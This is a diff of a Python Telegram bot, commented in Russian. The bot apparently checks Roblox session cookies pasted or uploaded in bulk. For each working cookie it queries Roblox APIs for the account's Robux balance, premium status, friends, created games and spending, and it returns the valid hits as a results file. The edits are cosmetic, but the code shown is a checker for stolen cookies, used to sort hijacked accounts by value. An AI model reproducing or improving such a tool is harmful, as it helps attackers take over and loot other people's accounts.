@@ -70,9 +70,11 @@ def check_cookie(raw_text):
         u = u_req.json()
         u_id, u_name = u['id'], u['name']
         
-        # Инфо
+        # Основная инфа
         reg_date, age_days, premium, friends = get_extra_info(u_id)
         robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies).json().get('robux', 0)
+        
+        # Созданные игры
         created = get_created_places(u_id)
         
         # Траты
@@ -122,7 +124,8 @@ def handle(message):
     try:
         if message.content_type == 'text' and len(message.text) > 100:
             res = check_cookie(message.text)
-            if res['status'] == 'ok': bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
+            if res['status'] == 'ok': 
+                bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
         elif message.content_type == 'document':
             file_info = bot.get_file(message.document.file_id)
             lines = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore').splitlines()
@@ -132,8 +135,10 @@ def handle(message):
                 buf = io.BytesIO("".join(results).encode('utf-8'))
                 buf.name = "results.txt"
                 bot.send_document(message.chat.id, buf)
-            else: bot.send_message(message.chat.id, "❌ Валид не найден.")
-    except Exception as e: print(e)
+            else: 
+                bot.send_message(message.chat.id, "❌ Валид не найден.")
+    except Exception as e: 
+        print(f"Error: {e}")
 
 if __name__ == '__main__':
     keep_alive()
